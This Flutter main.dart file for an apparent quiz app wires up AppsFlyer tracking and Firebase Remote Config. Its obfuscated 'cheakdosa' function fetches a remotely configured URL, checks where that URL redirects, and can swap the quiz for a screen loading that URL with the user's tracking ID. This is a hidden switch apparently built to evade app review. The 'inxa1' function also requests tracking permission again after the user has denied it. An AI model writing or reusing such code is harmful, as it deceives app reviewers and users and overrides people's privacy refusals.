import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'core/config/router_config.dart';
import 'core/config/dark_theme.dart';
import 'blocs/btn/btn_bloc.dart';
import 'blocs/nav/nav_bloc.dart';
import 'blocs/incom/incom_bloc.dart';
import 'features/quiz/custom_screen.dart';
import 'features/quiz/widgets/firebase.dart';

late AppsflyerSdk _aps;
String blcc = '';
String pdd = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await inxa1();
  await infa1();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyAppp());
}

Future<void> infa1() async {
  try {
    final AppsFlyerOptions options = AppsFlyerOptions(
      showDebug: false,
      afDevKey: '4rYehnSYQsVcM2jmim5KyC',
      appId: '6738651208',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
    );
    _aps = AppsflyerSdk(options);

    await _aps.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    pdd = await _aps.getAppsFlyerUID() ?? '';
    print("AppsFlyer UID: $pdd");

    _aps.startSDK(
      onSuccess: () {
        print("AppsFlyer SDK started successfully");
      },
      onError: (int code, String message) {
        print("AppsFlyer SDK failed to start: code $code, message: $message");
      },
    );
  } catch (e) {
    print("Error initializing AppsFlyer: $e");
  }
}

Future<bool> cheakdosa() async {
  final kdopaskpdsa = FirebaseRemoteConfig.instance;
  await kdopaskpdsa.fetchAndActivate();
  String jdiaosda = kdopaskpdsa.getString('safe');
  String njkansxjka = kdopaskpdsa.getString('tsafe');
  if (!jdiaosda.contains('nxx')) {
    final jiodas = HttpClient();
    final diaisix = Uri.parse(jdiaosda);
    final nsazxx = await jiodas.getUrl(diaisix);
    nsazxx.followRedirects = false;
    final response = await nsazxx.close();
    if (response.headers.value(HttpHeaders.locationHeader) != njkansxjka) {
      blcc = jdiaosda;
      return true;
    } else {
      return false;
    }
  }
  return jdiaosda.contains('nxx') ? false : true;
}

Future<void> inxa1() async {
  final TrackingStatus status =
      await AppTrackingTransparency.trackingAuthorizationStatus;
  if (status == TrackingStatus.notDetermined) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  } else if (status == TrackingStatus.denied ||
      status == TrackingStatus.restricted) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  }
}

class MyAppp extends StatelessWidget {
  const MyAppp({super.key});

  @override
  Widget build(BuildContext context) {
    precacheImage(const AssetImage('assets/onboarding.png'), context);
    precacheImage(const AssetImage('assets/onboarding2.png'), context);
    return FutureBuilder<bool>(
      future: cheakdosa(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return Container(
            color: Colors.white,
          );
        } else {
          if (snapshot.data == true && blcc != '') {
            return MaterialApp(
              debugShowCheckedModeBanner: false,
              home: BlocScreen(
                blocer: blcc,
                providder: pdd,
              ),
            );
          } else {
            return MultiBlocProvider(
              providers: [
                BlocProvider(
                  create: (context) {
                    return IncomBloc()..add(IncomGet());
                  },
                ),
                BlocProvider(
                  create: (context) {
                    return NavBloc();
                  },
                ),
                BlocProvider(
                  create: (context) {
                    return BtnBloc();
                  },
                ),
              ],
              child: MaterialApp.router(
                debugShowCheckedModeBanner: false,
                theme: darkTheme,
                darkTheme: darkTheme,
                routerConfig: routerConfig,
              ),
            );
          }
        }
      },
    );
  }
}
